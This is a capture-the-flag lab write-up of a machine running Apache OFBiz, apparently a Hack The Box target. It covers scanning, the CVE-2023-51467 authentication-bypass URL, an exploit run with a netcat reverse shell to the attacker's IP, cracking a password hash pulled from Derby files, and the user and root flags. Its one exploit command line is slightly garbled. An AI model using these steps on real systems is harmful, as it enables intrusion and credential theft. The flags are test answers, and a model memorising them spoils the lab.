# Buziness

> IP: [10.10.11.252]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.10.11.252 -oN init_scan
      1. Port 22 -> ssh
      2. Port 80 -> http
         1. http-title: Did not follow redirect to https://bizness.htb/
            1. Need to add this to my /etc/hosts
      3. Port 443 -> ssl
3. HTTP
   1. Navigate to website
   2. Looking through source code it looks pretty normal
   3. DIRB
      1. /accounting
         1. This redirects to /control/main
            1. This is a login screen
            2. At the bottom we see this is using "Apache OFBiz. Release 18.12"
4. RESEARCH
   1. We see there is a CVE-2023-51467 -> which shows an authentication bypass vulnerability
      1. It looks like it revolves around /webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y"
         1. Lets test this
            1. URL: https://bizness/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y
            2. RESPONSE: PONG
            3. So it looks like this is vulnerable
   2. Looking further into the CVE
      1. We see that we can exploit the /webtools/control/xmplrpc
5. CVE
   1. We see there is an authentication bypass tool on github
      1. LINK: "https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git"
      2. Lets pull down this tool and run it
   2. EXPLOIT
      1. We know the tool allows for two main options
         1. Scanning -> to see if the app is vulnerable (which we already proved earlier it was)
         2. Command -> to run commands
      2. Lets setup a revshell command
         1. > nc -e /bin/bash MY_IP_ADDR 1234
      3. RUN TOOL
         1. > python3 exploit.py --url https://bizness.htb --cmd 'nc -e MY_IP_ADDR 10.10.14.251 1234'
            1. SUCCESS!
            2. Stabilize shell
6. ENUMERATION
   1. Check user home directories
      1. > ls /home
         1. obfiz
      2. > ls /home/obfiz
      3. > cat /home/obfiz/user.txt
         1. FLAG: `747dae576cd60a53d64b5d9cc000e779`
   2. LINPEAS
      1. /etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
         1. Our path isn't editable though
      2. -rwxr-sr-x 1 root tty 23K Jan 20  2022 /usr/bin/write.ul (Unknown SGID binary)
         1. No luck
   3. Manual Enumeration
      1. Lets search fro any admin files
         1. > find / -name *Admin* 2>/dev/null
            1. /opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml
            2. Lets go check this out
               1. > cat ../AdminUserLoginData.xml

                    ```xml
                        <entity-engine-xml>
                            <UserLogin userLoginId="@userLoginId@" currentPassword="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a" requirePasswordChange="Y"/>
                            <UserLoginSecurityGroup groupId="SUPER" userLoginId="@userLoginId@" fromDate="2001-01-01 12:00:00.0"/>
                        </entity-engine-xml>
                    ```

                    1. In here it looks like there is a user and a hashed password - however this is only half
   4. RESEARCH
      1. We found out that ofbiz uses apache derby database - and these files are stored as .dat
         1. Lets look for .dat files
            1. > find / -type -name *.dat
               1. We see there are thousands in the "/opt/ofbiz/runtime/data/derby/ofbiz/seg0" directory
               2. We will definitely need a way to weed out of these
                  1. > grep -r "password" . -i
                     1. c6010.dat
                     2. c6850.dat
                     3. c5fa1.dat
                     4. c180.dat
                     5. c54d0.dat
                     6. ca1.dat
                     7. c6021.dat
                     8. c60.dat
                     9. c5f90.dat
                     10. c191.dat
                     11. c90.dat
                     12. c71.dat
                     13. c1930.dat
                     14. c1c70.dat
               3. This narrows it down so lets start looking at the files
                  1. In c54d0.dat we see the line "currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I""
                  2. Now we have a password to crack
7. CRACK THE HASH
   1. First need to reverse the base64.urlsafe_b64encode() function
      1. CYBERCHEF -> FROM BASE64 -> TO HEX (NO SPACES) -> "b8fd3f41a541a435857a8f3e751cc3a91c174362"
      2. Now we just need to add the :d as that was our original salt
   2. HASHCAT
      1. > hashcat -m 120 'b8fd3f41a541a435857a8f3e751cc3a91c174362:d' /opt/rockyou.txt
         1. RESPONSE: `monkeybizness`
8. ESCALATE
   1. Now lets try switching users
      1. > su root
         1. PW: monkeybizness
         2. SUCCESS!
   2. GET FLAG:
      1. > cat /root/root.txt
         1. FLAG: `c835d95824f3998427d24db6ffa778b6`

## QUESTIONS

1. User Flag
   1. `747dae576cd60a53d64b5d9cc000e779`
2. Root Flag
   1. `c835d95824f3998427d24db6ffa778b6`
